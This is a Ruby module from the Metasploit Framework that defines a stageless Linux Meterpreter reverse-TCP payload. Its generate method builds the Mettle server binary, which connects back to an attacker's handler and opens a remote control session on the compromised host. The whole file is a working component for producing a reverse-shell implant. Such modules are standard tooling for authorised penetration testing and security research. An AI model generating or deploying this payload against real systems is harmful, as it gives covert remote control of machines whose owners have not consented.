##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 1140752

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig
  include Msf::Payload::Linux::MultiArch # must be last

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Meterpreter, Reverse TCP Inline',
        'Description' => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author' => 'Brendan Watters <bwatters[at]rapid7.com>',
        'Platform' => 'linux',
        'Arch' => ARCH_ANY,
        'License' => MSF_LICENSE,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::MeterpreterMultiLinux
      )
    )
  end

  def generate(opts = {})
    mettle_arch = mettle_arch_transform(desired_arch(opts))
    opts = {
      scheme: 'tcp',
      stageless: true
    }.merge(mettle_logging_config)
    MetasploitPayloads::Mettle.new(mettle_arch, generate_config(opts)).to_binary :exec
  end
end
